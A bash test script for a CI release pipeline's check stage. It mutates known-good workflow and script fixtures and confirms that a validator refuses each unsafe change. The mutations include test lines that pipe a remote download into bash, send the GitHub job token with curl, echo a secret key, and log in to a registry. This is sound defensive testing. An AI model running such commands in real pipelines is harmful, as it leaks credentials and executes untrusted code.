#!/usr/bin/env bash
# proves: REQ-CHAIN-006-AC1, REQ-CHAIN-006-AC2, REQ-CHAIN-006-AC3, REQ-CHAIN-006-AC8, REQ-CHAIN-006-AC9, REQ-CHAIN-006-AC10
# RED until PR 3 is implemented (stage-verify.yml rewritten, bin/check-*.sh, release.yml graph, the old acceptance stages removed): step 4.
#
# Check, static half (v0.3.0 rules 50, 53, 55, 58, 61, 63, 65, 66, 68, 70, 72, 79; advisor read-back approved Oct 9; PR 3 merges into chain-v030 only).
# Runs on ubuntu-24.04 or macOS with: bash, python3 + PyYAML (apt: python3-yaml), jq. No network, no secrets, no keys.
# Every judge lives in bin/chain-check-shape.py and is FIRST proven on a known-good fixture and on mutated copies (a judge that cannot fail
# proves nothing), then applied to the real repository, which must pass. Finite grammars and allowlists, no shell analysis.
#
# WHAT IS FIXED BY AN EXISTING FILE and what is PROPOSED/UNVERIFIED (the lines marked [P] may change when the implementation PR is written):
#   [F] .github/policy/scanners.json lists the release scanners (today grype and osv-scanner); REQ-REL-004-AC1 (every scanner reports its package
#       count, zero fails); /statusz reports "fips140" (bool) and "fips140_note" (internal/server/status.go:30-31, internal/buildinfo/buildinfo.go:85-97:
#       "active (Go validated module v1.0.0, CMVP cert #5247)" for the validated build, "off" for the standard one).
#   [F] PR 1's bin/chain-verify.py contract (stage-start, verify) and PR 2's artifact names (witness-build, digests, dist, locks) and the OCI index
#       digest outputs (OUT/<variant>.tar, .digest, .manifests) of cache's assemble-image.sh.
#   [P] images arrive as files under images/ (OCI tarballs from Build's artifacts; Check logs in to no registry), the artifact names `provenance`
#       (Sign's bundle) and `check-results`/`witness-check` (Check's), the five script names and command lines of bin/check-stage.sh, the guide
#       file docs/verify-release.md (the www lane's customer guide), the results file names.
#
# CREDENTIALS (coordinator correction, Oct 9): Check holds NO secret and no cloud federation: the release scanners need none. id-token: write is
# only for Witness to sign Check's own record. A test below refuses a secret, a registry login and a packages/attestations permission.
set -euo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
shape="$root/bin/chain-check-shape.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL PyYAML is required (apt: python3-yaml)"; exit 1; }
ok()  { pass=$((pass + 1)); echo "ok   $1"; }
bad() { failn=$((failn + 1)); echo "FAIL $1"; }
judge() { python3 "$shape" "$@"; }
expect() { # expect ok|caught LABEL WORD args...  (WORD: a word the fault message must contain, for caught)
  local want=$1 label=$2 word=$3; shift 3; local out rc=0
  out=$(judge "$@" 2>&1) || rc=$?
  if [ "$want" = ok ]; then
    if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> $out"; fi
  else
    if [ "$rc" = 1 ] && grep -Fq -- "$word" <<< "$out"; then ok "$label (caught: ${out:0:90})"; else bad "$label -> rc=$rc, wanted a refusal containing '$word': ${out:0:140}"; fi
  fi
}
mutate() { # mutate SRC DST REGEX REPLACEMENT   (a pattern that no longer matches is a FAILURE, never a skipped case)
  python3 - "$1" "$2" "$3" "$4" <<'PY' || { bad "mutation did not apply: $3"; return 1; }
import re, sys
t = open(sys.argv[1]).read()
n = re.sub(sys.argv[3], sys.argv[4].replace("\\n", "\n"), t, count=1, flags=re.S)
assert n != t, "mutation did not change the fixture"
open(sys.argv[2], "w").write(n)
PY
}
# ---- known-good fixtures ----------------------------------------------------------------------------------------------
python3 - "$work" <<'PY'
import sys, os
w = sys.argv[1]
CHK = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
UPL = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1"
DWN = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1"
def dn(name, path): return f"      - uses: {DWN}\n        with:\n          name: {name}\n          path: {path}\n"
def up(name, path): return f"      - uses: {UPL}\n        with:\n          name: {name}\n          path: {path}\n"
WIT = """      - name: check under Witness
        run: |
          set -euo pipefail
          curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore" -o "$RUNNER_TEMP/tok.json"
          jq -r .value "$RUNNER_TEMP/tok.json" > "$RUNNER_TEMP/tok"
          echo "::add-mask::$(cat "$RUNNER_TEMP/tok")"
          witness run --step check \\
            --signer-fulcio-url https://fulcio.sigstore.dev \\
            --signer-fulcio-oidc-issuer https://token.actions.githubusercontent.com \\
            --signer-fulcio-oidc-client-id sigstore \\
            --signer-fulcio-token-path "$RUNNER_TEMP/tok" \\
            -t https://timestamp.sigstore.dev/api/v1/timestamp \\
            -a environment,git,material,product \\
            --env-filter-sensitive-vars \\
            --env-add-sensitive-key 'ACTIONS_ID_TOKEN_REQUEST*' --env-add-sensitive-key ACTIONS_RUNTIME_TOKEN \\
            -d out -o witness-check/check-collection.json \\
            -- ./bin/check-stage.sh
"""
stage = ("name: 'Stage: check'\non:\n  workflow_call:\npermissions:\n  contents: read\njobs:\n  check:\n    runs-on: ubuntu-24.04\n"
         "    permissions:\n      contents: read\n      id-token: write\n    steps:\n"
         f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
         "      - name: install Witness (pinned by checksum)\n        run: ./bin/install-scanner.sh witness\n"
         + dn("witness-build", "witness-build") + dn("digests", "witness-build") + dn("provenance", "provenance") + dn("dist", "dist")
         + WIT + up("witness-check", "witness-check") + up("check-results", "check-results"))
open(w + "/stage.yml", "w").write(stage)
SC = ["python3 bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json",
      "python3 bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json",
      "bash bin/check-scan.sh --scanners .github/policy/scanners.json --digests witness-build/digests.json --images images --archives dist --out check-results",
      "bash bin/check-fips.sh --digests witness-build/digests.json --images images --out check-results",
      "bash bin/check-acceptance.sh gradle --digests witness-build/digests.json --images images --out check-results",
      "bash bin/check-acceptance.sh maven --digests witness-build/digests.json --images images --out check-results",
      "bash bin/check-acceptance.sh egress --digests witness-build/digests.json --images images --out check-results",
      "bash bin/check-guide.sh --guide docs/verify-release.md --digests witness-build/digests.json --images images --out check-results"]
open(w + "/script.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n" + "\n".join(SC) + "\n")
open(w + "/release.yml", "w").write("""name: Release
on:
  push:
    tags: ["v*"]
jobs:
  build:
    uses: ./.github/workflows/stage-build.yml
  sign:
    needs: build
    uses: ./.github/workflows/stage-sign.yml
  rebuild:
    needs: build
    uses: ./.github/workflows/stage-reproducibility.yml
  check:
    needs: [build, sign]
    uses: ./.github/workflows/stage-verify.yml
  promotion:
    needs: [build, sign, rebuild, check]
    uses: ./.github/workflows/stage-promote.yml
""")
os.makedirs(w + "/plain", exist_ok=True)
for n in ("check-stage", "check-scan", "check-fips", "check-acceptance", "check-guide"):
    open(f"{w}/plain/{n}.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\ngrype --version\nosv-scanner --version\ndocker run --rm -d image\ncurl -sS http://127.0.0.1:8080/statusz\n")
PY
expect ok "fixture: the known-good stage-verify.yml passes the stage judge" "" stage "$work/stage.yml"
expect ok "fixture: the known-good bin/check-stage.sh passes the script judge" "" script "$work/script.sh"
expect ok "fixture: the known-good release.yml passes the graph judge" "" graph "$work/release.yml"
expect ok "fixture: plain scripts that only use scanners, docker and curl pass the plain judge" "" plain "$work"/plain/check-*.sh
# ---- AC1/AC9: the stage file, mutated one rule at a time ----------------------------------------------------------------
m() { # m NAME REGEX REPL WORD LABEL
  if mutate "$work/stage.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" stage "$work/$1.yml"; fi
}
m s_job2   'jobs:\n  check:'                                  'jobs:\n  extra:\n    runs-on: ubuntu-24.04\n    steps: []\n  check:'  'exactly one job'   "AC1 a second job"
m s_selfh  'runs-on: ubuntu-24.04'                             'runs-on: self-hosted'                                  'ubuntu-24.04'      "AC1 a self-hosted runner"
m s_cont   '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    container: alpine\n'       'job keys'          "AC1 a job container"
m s_serv   '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    services: {db: {image: x}}\n' 'job keys'        "AC1 job services"
m s_env    '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    env: {X: y}\n'              'job keys'          "AC1 job env"
m s_def    '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    defaults: {run: {shell: sh}}\n' 'job keys'      "AC1 job defaults"
m s_needs  '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    needs: x\n'                 'job keys'          "AC1 a needs inside the stage file"
m s_pkgw   'id-token: write\n    steps'                      'id-token: write\n      packages: write\n    steps'     'permissions'       "AC1 packages: write"
m s_pkgr   'id-token: write\n    steps'                      'id-token: write\n      packages: read\n    steps'      'permissions'       "AC1 packages: read (images travel as files)"
m s_att    'id-token: write\n    steps'                      'id-token: write\n      attestations: write\n    steps'  'permissions'       "AC1 attestations: write"
m s_noid   'id-token: write'                                   'id-token: none'                                         'permissions'       "AC1 no id-token"
m s_sec    'name: check under Witness'                         'name: check under Witness\n        env:\n          K: ${{ secrets.SNYK_TOKEN }}'  'step keys'  "AC1 a secret in a step"
m s_login  '      - name: install Witness'                     '      - name: login\n        run: echo x | docker login ghcr.io -u u --password-stdin\n      - name: install Witness' 'registry login' "AC1 a registry login"
m s_unp    'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v4'                                  'digest-pinned'    "AC1 an unpinned checkout"
m s_persist 'persist-credentials: false'                       'persist-credentials: true'                              'persist-credentials' "AC1 persisted credentials"
m s_dlname 'name: provenance'                                  'name: not-listed'                                       'download-artifact' "AC1 a download outside the allowlist"
m s_dlbin  'path: provenance'                                  'path: bin'                                              'download-artifact' "AC1 a download into bin/"
m s_upname 'name: check-results'                               'name: anything'                                         'upload-artifact'   "AC1 an upload outside the allowlist"
m s_ghscr  '      - name: install Witness'                     '      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n      - name: install Witness' 'uses not allowed' "AC1 github-script"
m s_comp   '      - name: install Witness'                     '      - uses: ./.github/actions/x\n      - name: install Witness'  'uses not allowed' "AC1 a local composite action"
m s_twowit '      - name: check under Witness'                 '      - name: second\n        run: echo hi\n      - name: check under Witness' 'ONE witness step' "AC1 a second run step"
m s_after  '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: witness-check' '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: dist2\n      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: witness-check' 'after Witness' "AC1 a download after Witness started"
m s_gh     '-a environment,git,material,product'               '-a environment,git,github,product'                      'github'            "AC9 the github attestor (it embeds the raw OIDC token)"
m s_slsa   '-a environment,git,material,product'               '-a environment,git,material,product,slsa'               'slsa'              "AC9 the slsa attestor (Sign's alone)"
m s_step   'witness run --step check'                          'witness run --step build'                               '--step'            "AC9 a wrong step name"
m s_ts     '-t https://timestamp.sigstore.dev/api/v1/timestamp' '-t https://timestamp.example.com/api'                  '-t'                "AC9 another timestamp authority"
m s_fulcio '--signer-fulcio-url https://fulcio.sigstore.dev'   '--signer-fulcio-url https://fulcio.example.com'          '--signer-fulcio-url' "AC9 another Fulcio"
m s_nofilt '            --env-filter-sensitive-vars \\\n'      ''                                                        'env-filter'        "AC9 the environment filter dropped"
m s_tok    '--env-add-sensitive-key ACTIONS_RUNTIME_TOKEN'     '--env-add-sensitive-key SOMETHING_ELSE'                  'sensitive key'     "AC9 the token variable no longer filtered"
m s_out    '-o witness-check/check-collection.json'            '-o elsewhere.json'                                      '-o'                "AC9 the collection written elsewhere"
m s_end    '-- ./bin/check-stage.sh'                           '-- ./bin/other.sh'                                      'check-stage.sh'    "AC1 witness run ends with another script"
m s_fetch  'echo "::add-mask::\$\(cat "\$RUNNER_TEMP/tok"\)"'  'echo hi'                                               'token-fetch'       "AC9 the token is no longer masked"
m s_nosh   'set -euo pipefail\n          curl'                'curl'                                                   'set -euo pipefail' "AC1 the witness step without set -euo pipefail"
m s_wf     'permissions:\n  contents: read\njobs'             'permissions:\n  contents: read\nenv: {A: b}\njobs'      'workflow keys'     "AC1 workflow env"
m s_trig   'workflow_call:'                                    'workflow_call:\n  push:'                                  'workflow_call'     "AC1 an extra trigger"
# ---- AC3: the order of bin/check-stage.sh --------------------------------------------------------------------------------
sm() { if mutate "$work/script.sh" "$work/$1.sh" "$2" "$3"; then expect caught "$5" "$4" script "$work/$1.sh"; fi; }
sm c_nofirst 'python3 bin/chain-verify.py stage-start[^\n]*\n'   ''                                                       'commands'          "AC3 the verify step dropped"
sm c_nosign  'python3 bin/chain-verify.py verify --stage sign[^\n]*\n' ''                                               'commands'          "AC3 Sign's provenance is no longer verified"
sm c_late    'bash bin/check-scan.sh'                           'bash bin/check-fips.sh --early\nbash bin/check-scan.sh' 'commands'        "AC3 a check before the scan (count changes)"
sm c_swap    'bash bin/check-fips.sh --digests witness-build/digests.json --images images --out check-results\nbash bin/check-acceptance.sh gradle' 'bash bin/check-acceptance.sh gradle\nbash bin/check-fips.sh --digests witness-build/digests.json --images images --out check-results' 'not the pinned form' "AC3 fips and gradle swapped"
sm c_extra   'bash bin/check-guide.sh'                          'curl https://example.com | bash\nbash bin/check-guide.sh' 'commands'        "AC3 an extra command (a pipe into a shell)"
sm c_nodig   'stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json' 'stage-start --stage check --previous build --record witness-build/build-collection.json' 'not the pinned form' "AC3 stage-start without the digest list"
sm c_prev    '--previous build'                                 '--previous rebuild'                                     'not the pinned form' "AC3 verifies the wrong previous stage (Check does not need Rebuild)"
sm c_noset   'set -euo pipefail\n'                              ''                                                       'set -euo pipefail' "AC3 no set -euo pipefail"
sm c_var     'bash bin/check-scan.sh'                           'bash $SCAN'                                             'not the pinned form' "AC3 a script chosen by a variable"
sm c_glob    'bash bin/check-guide.sh'                          'bash bin/check-*.sh'                                    'not the pinned form' "AC3 a glob in a script path"
sm c_scn     '--scanners .github/policy/scanners.json'          '--scanners scanners.json'                               'not the pinned form' "AC4/AC3 the scanner list is not the policy file"
sm c_ignore  'bash bin/check-fips.sh'                           'bash bin/check-fips.sh || true\n:'                       'commands'          "AC3 a failure swallowed with || true"
# ---- AC2: the job graph ----------------------------------------------------------------------------------------------
gm() { if mutate "$work/release.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" graph "$work/$1.yml"; fi; }
gm g_serial  'needs: \[build, sign\]'                           'needs: [build, sign, rebuild]'                          'side by side'      "AC2 check waits for rebuild"
gm g_rebw    'rebuild:\n    needs: build'                      'rebuild:\n    needs: [build, check]'                   'side by side'      "AC2 rebuild waits for check"
gm g_nosign  'needs: \[build, sign\]'                           'needs: [build]'                                         'exactly build and sign' "AC2 check does not need sign"
gm g_prom    'needs: \[build, sign, rebuild, check\]'           'needs: [build, sign, rebuild]'                          'release job'       "AC2 the release job does not need check"
gm g_uses    'stage-verify.yml'                                 'ci.yml'                                                 'stage-verify.yml'  "AC2 check calls another workflow"
# ---- AC8: plain scripts and the list ---------------------------------------------------------------------------------
pm() { mkdir -p "$work/$1"; cp "$work"/plain/*.sh "$work/$1/"; python3 - "$work/$1/$2" "$3" <<'PY'
import sys
open(sys.argv[1], "a").write(sys.argv[2] + "\n")
PY
  expect caught "$5" "$4" plain "$work/$1"/check-*.sh; }
pm p_cosign  check-scan.sh      'cosign verify "$IMG"'                'cosign'            "AC8 a signing tool in a check script"
pm p_wit     check-stage.sh     'witness verify -p policy.json'       'witness'           "AC8 witness in a check script"
pm p_login   check-fips.sh      'docker login ghcr.io -u u'           'docker login'      "AC8 a registry login"
pm p_secret  check-guide.sh     'echo "$SECRET_KEY"'                  'secret'            "AC8 a secret"
pm p_token   check-acceptance.sh 'curl -H "Authorization: $GITHUB_TOKEN" x' 'GITHUB_TOKEN' "AC8 the job token"
pm p_idtok   check-scan.sh      'echo "$ACTIONS_ID_TOKEN_REQUEST_URL"' 'ACTIONS_ID_TOKEN'  "AC8 the identity token request"
pm p_snyk    check-scan.sh      'snyk test --severity-threshold=low'  'snyk'               "AC8 Snyk (rescan only, needs a token)"
pm p_attest  check-guide.sh     'gh attestation verify x'             'attest'            "AC8 attestation tooling"
pm p_com     check-fips.sh      '# cosign sign is not used here'      'cosign'            "AC8 a signer named in a comment (over-reports by design)"
mkdir -p "$work/l" && python3 - "$work/l" <<'PY'
import hashlib, json, os, sys
w = sys.argv[1]
os.makedirs(w + "/bin", exist_ok=True)
rows = []
for n in ("check-stage", "check-scan", "check-fips", "check-acceptance", "check-guide"):
    p = f"bin/{n}.sh"; open(f"{w}/{p}", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n")
    rows.append({"path": p, "sha256": hashlib.sha256(open(f"{w}/{p}", "rb").read()).hexdigest(), "tools": [], "signs": False, "runs": [], "reason": "fixture"})
os.makedirs(w + "/.github/policy", exist_ok=True)
json.dump({"env_names": [], "scripts": rows}, open(w + "/.github/policy/chain-scripts.json", "w"))
PY
expect ok "fixture: all five check scripts listed with their sha256 and signs: false" "" listed "$work/l/.github/policy/chain-scripts.json" "$work/l"
cp -r "$work/l" "$work/l2"; python3 - "$work/l2" <<'PY'
import json, sys
p = sys.argv[1] + "/.github/policy/chain-scripts.json"; d = json.load(open(p)); d["scripts"] = d["scripts"][1:]; json.dump(d, open(p, "w"))
PY
expect caught "AC8 a check script not listed" "not listed" listed "$work/l2/.github/policy/chain-scripts.json" "$work/l2"
cp -r "$work/l" "$work/l3"; echo "echo changed" >> "$work/l3/bin/check-fips.sh"
expect caught "AC8 a script changed after it was listed (sha256)" "sha256" listed "$work/l3/.github/policy/chain-scripts.json" "$work/l3"
cp -r "$work/l" "$work/l4"; python3 - "$work/l4" <<'PY'
import json, sys
p = sys.argv[1] + "/.github/policy/chain-scripts.json"; d = json.load(open(p)); d["scripts"][2]["signs"] = "other"; json.dump(d, open(p, "w"))
PY
expect caught "AC8 a check script listed as a signer" "signs: false" listed "$work/l4/.github/policy/chain-scripts.json" "$work/l4"
# ---- AC10: the old acceptance stages --------------------------------------------------------------------------------
mkdir -p "$work/r/.github/workflows"; cp "$work/release.yml" "$work/r/.github/workflows/release.yml"
expect ok "fixture: none of the old acceptance stages and no call to them" "" removed "$work/r"
cp -r "$work/r" "$work/r2"; : > "$work/r2/.github/workflows/stage-authorize.yml"
expect caught "AC10 stage-authorize.yml still exists" "stage-authorize.yml" removed "$work/r2"
cp -r "$work/r" "$work/r3"; printf '  accept:\n    uses: ./.github/workflows/stage-acceptance-egress.yml\n' >> "$work/r3/.github/workflows/release.yml"
expect caught "AC10 release.yml still calls an old acceptance stage" "stage-acceptance-egress.yml" removed "$work/r3"
cp -r "$work/r" "$work/r4"; printf '  acc:\n    uses: ./.github/workflows/acceptance.yml\n' >> "$work/r4/.github/workflows/release.yml"
expect caught "AC10 release.yml still calls acceptance.yml" "acceptance.yml" removed "$work/r4"
# ---- the real repository (RED until PR 3 is implemented) ---------------------------------------------------------------
expect ok "the real stage-verify.yml is the Check stage" "" stage "$root/.github/workflows/stage-verify.yml"
expect ok "the real bin/check-stage.sh runs verify, scan, fips, gradle, maven, egress, guide in order" "" script "$root/bin/check-stage.sh"
expect ok "the real release.yml runs check beside rebuild and the release job needs all four" "" graph "$root/.github/workflows/release.yml"
expect ok "the real check scripts are plain" "" plain "$root"/bin/check-stage.sh "$root"/bin/check-scan.sh "$root"/bin/check-fips.sh "$root"/bin/check-acceptance.sh "$root"/bin/check-guide.sh
expect ok "the real check scripts are listed in chain-scripts.json with their sha256" "" listed "$root/.github/policy/chain-scripts.json" "$root"
expect ok "the old acceptance stages are gone from the real repository and release.yml" "" removed "$root"
EXPECT=79
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
